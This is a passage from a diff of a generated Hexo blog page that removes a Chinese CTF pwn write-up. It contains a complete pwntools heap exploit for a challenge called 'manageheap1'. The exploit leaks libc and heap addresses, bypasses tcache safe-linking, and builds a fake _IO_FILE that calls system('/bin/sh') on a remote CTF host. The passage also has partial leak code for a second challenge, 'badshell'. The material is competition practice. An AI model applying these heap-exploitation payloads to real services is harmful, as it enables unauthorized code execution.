-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./manageheap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x1868)\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge,cmd)</span></span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.159.33&#x27;</span>,<span class="string">&#x27;58012&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice: &quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">number,name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(number))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;&gt; \n&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,<span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input your idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;please input your id:&quot;</span>,<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x7</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">p.send(p64(<span class="number">0x621</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x3f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Member: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">libc_puts = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">success(<span class="string">&quot;_IO_wfile_jumps &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">main_arena1 = libc_base + <span class="number">0x219c0a</span></span><br><span class="line">main_arena2 = libc_base + <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;main_arena1 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena1))</span><br><span class="line">success(<span class="string">&quot;main_arena2 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(main_arena2))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x0000000000090529</span></span><br><span class="line"></span><br><span class="line">key = heap_base // <span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">success(<span class="string">&quot;IO_list_all^key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x50a37</span>,<span class="number">0xebcf1</span>,<span class="number">0xebcf5</span>,<span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">0</span>] + libc_base</span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;libc_system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_system))</span><br><span class="line"></span><br><span class="line">target_chunk = heap_base + <span class="number">0x340</span></span><br><span class="line">target = target_chunk ^ key</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(target))</span><br><span class="line">p.sendline(p64(IO_list_all^key))</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x430</span> </span><br><span class="line">payload_addr = heap_base</span><br><span class="line">flag_addr = heap_base</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">&quot;/bin/sh\x00&quot;</span>         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(libc_system)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;cccccccc&quot;</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccccccc&quot;</span>,<span class="string">&quot;cccccccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">&quot;cccc&quot;</span>,p64(fake_io_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input your major&#x27;s number:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;please input your name:&quot;</span>,<span class="string">&quot;win&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>PS：菜鸡 pwn 手的第一个3血</p>
-<h2 id="badshell"><a href="#badshell" class="headerlink" title="badshell"></a>badshell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.\n</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">badshell: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">7b</span>723a1405c35735c73c5600c68ee2c53b2a1f33, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，全开</li>
-</ul>
-<p><strong>入侵思路</strong></p>
-<p>本题目没有做出来，比赛时没有时间做了，赛后复现找不到 wp 也很头痛</p>
-<p>cpp 的堆环境很乱，并且逆向出来也很难看，暂时没有找到漏洞点，但通过遗留在 unsorted chunk 中的 main_arena 指针，和遗留在 tcache chunk 中的 next 指针，可以完成泄露</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">touch(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">touch(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">mkdir(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x780</span>)</span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed063</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x11</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x12a63</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
-<p>但程序只要执行过一次 <code>echo</code> 后（必须成功写入数据），再次执行 <code>touch</code> 和 <code>mkdir</code> 都会报错</p>
-<p>暂时只能完成泄露了，找不到漏洞点</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2548,7 +2582,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">207</span>
+          <span class="site-state-item-count">208</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2561,7 +2595,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">123</span>
+        <span class="site-state-item-count">124</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -2602,7 +2636,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">41:49</span>
+    <span title="Reading time total">42:02</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
